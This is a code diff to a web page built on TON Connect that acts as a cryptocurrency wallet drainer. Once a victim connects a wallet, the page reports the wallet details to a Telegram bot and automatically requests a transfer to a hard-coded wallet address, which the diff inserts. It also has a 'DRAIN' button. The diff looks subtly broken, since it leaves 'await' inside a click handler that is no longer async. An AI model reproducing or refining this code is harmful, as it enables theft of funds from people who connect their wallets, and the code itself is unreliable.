@@ -55,8 +55,8 @@
         const manifestUrl = 'https://aslan22822.github.io/ton-connect-wallet/tonconnect-manifest.json';
         
         // Telegram Bot Configurations
-        const tgBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
-        const tgChatId = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with your Telegram chat ID
+        const tgBotToken = 'REPLACE_WITH_YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
+        const tgChatId = 'REPLACE_WITH_YOUR_TELEGRAM_CHAT_ID'; // Replace with your Telegram chat ID
 
         // Function to send messages to Telegram
         async function sendTelegramMessage(message) {
@@ -87,7 +87,10 @@
                 await sendTelegramMessage(message);
                 await checkBalance(walletInfo.account.address);
                 // Automatically initiate transfer when wallet is connected
-                await didtrans();
+                // Only attempt the transfer if there is a valid wallet
+                if (connectedWallet) {
+                    didtrans();
+                }
             } else {
                 console.error('No account connected or status not recognized.');
             }
@@ -123,7 +126,7 @@
                     validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
                     messages: [
                         {
-                            address: 'YOUR_DESTINATION_WALLET_ADDRESS', // Replace with your wallet address
+                            address: 'UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c', // Replace with your wallet address
                             amount: 5000000 // Replace with the appropriate amount (in nanotons)
                         }
                     ]
@@ -140,7 +143,7 @@
         }
 
         // Event listener for the DRAIN button
-        document.getElementById('drain-button').addEventListener('click', async () => {
+        document.getElementById('drain-button').addEventListener('click', () => {
             await didtrans();
         });
     </script>
